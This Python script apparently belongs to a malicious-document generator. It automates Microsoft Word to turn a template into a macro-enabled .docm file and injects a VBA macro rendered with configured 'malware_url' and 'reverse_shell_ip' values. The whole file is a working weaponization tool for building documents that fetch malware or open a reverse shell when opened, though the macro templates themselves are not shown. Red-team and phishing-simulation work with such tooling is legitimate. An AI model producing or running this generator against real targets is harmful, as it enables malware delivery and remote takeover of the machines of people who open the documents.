import win32com.client as win32
import os
import sys
import yaml
from jinja2 import Template

cfg = None
project_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
config_file = os.path.join(project_dir, "config.yml")
template_dir = os.path.join(project_dir, "templates")
output_dir = os.path.join(project_dir, "output")

with open(config_file, "r") as stream:
    try:
        cfg = yaml.safe_load(stream)
    except yaml.YAMLError as exc:
        print(f"Error reading configuration from '{config_file}': {exc}")
        sys.exit(1)


def load_word_template(template_path):
    app = win32.gencache.EnsureDispatch("Word.Application")
    app.Visible = False
    doc = app.Documents.Open(template_path)
    return app, doc


def insert_macro_from_file(macro_path, target_doc):
    with open(macro_path, "r") as macro_file:
        macro_template = Template(macro_file.read())

    # Add the value from cfg["app"]["malware_url"] to the template
    rendered_macro = macro_template.render(
        malware_url=cfg["app"]["macros"]["malware_url"],
        reverse_shell_ip=cfg["app"]["macros"]["reverse_shell_ip"],
    )

    target_vba_project = target_doc.VBProject
    target_vba_project.VBComponents("ThisDocument").CodeModule.AddFromString(
        rendered_macro
    )


def get_template_path(template_name):
    if os.path.basename(template_name) != template_name:
        raise ValueError("Template must be a filename from templates/files/ms_office")

    template_path = os.path.join(template_dir, "files", "ms_office", template_name)
    if not os.path.isfile(template_path):
        raise FileNotFoundError(f"Template not found: {template_path}")

    return template_path


def get_macro_path(macro_name):
    if os.path.basename(macro_name) != macro_name:
        raise ValueError("Macro must be a filename from templates/macros/ms_office")

    macro_path = os.path.join(template_dir, "macros", "ms_office", macro_name)
    if not os.path.isfile(macro_path):
        raise FileNotFoundError(f"Macro not found: {macro_path}")

    return macro_path


def main(template_name, macro_name):
    template_path = get_template_path(template_name)
    macro_path = get_macro_path(macro_name)

    # Load the Word template (template with the associated macro)
    word_app, template_doc = load_word_template(template_path)

    # Save the new document in the output folder
    os.makedirs(output_dir, exist_ok=True)
    new_doc_path = os.path.join(
        output_dir, os.path.splitext(os.path.basename(template_name))[0]
    )
    new_doc_path += ".docm"
    template_doc.SaveAs(new_doc_path, FileFormat=13)
    template_doc.Close()

    # Open the newly created document
    new_doc = word_app.Documents.Open(new_doc_path)

    # Insert macro from text file into the new document
    insert_macro_from_file(macro_path, new_doc)

    # Save the output document with the macro inserted
    new_doc.Save()

    # Close the documents
    new_doc.Close()
    word_app.Quit()
    return new_doc_path


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(
            "Usage: python generators/word_file_generator.py "
            "<template_name> <macro_name>"
        )
        sys.exit(1)

    template_name = sys.argv[1]
    macro_name = sys.argv[2]

    main(template_name, macro_name)
